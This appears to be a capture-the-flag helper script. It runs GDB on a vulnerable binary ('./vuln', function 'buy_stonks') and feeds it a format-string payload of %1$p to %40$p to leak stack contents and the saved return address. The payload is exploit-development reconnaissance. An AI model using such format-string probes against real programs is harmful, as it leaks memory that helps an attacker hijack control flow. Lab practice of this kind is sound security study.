#!/bin/bash
cd ./_z_164
cat > g164.gdb <<'GDB'
set pagination off
set confirm off
break *0x400ac9
commands
  silent
  printf "=== printf(user_buf=%p)  rbp=%p rsp=%p\n", $rdi, $rbp, $rsp
  printf "buy_stonks ret addr slot = %p (valeur %p)\n", $rbp+8, *(void**)($rbp+8)
  printf "arg_slots (rsp): \n"
  x/24gx $rsp
  printf "--- au dessus de rbp:\n"
  x/16gx $rbp
  continue
end
run
GDB
printf '1\n%s\n' "$(python3 -c "print(''.join('%%%d\$p,'%i for i in range(1,41)))")" > in164.txt
timeout 60 gdb -q -batch -nx -x g164.gdb ./vuln < in164.txt > /tmp/g164.txt 2>&1
grep -A 45 "===" /tmp/g164.txt | head -60
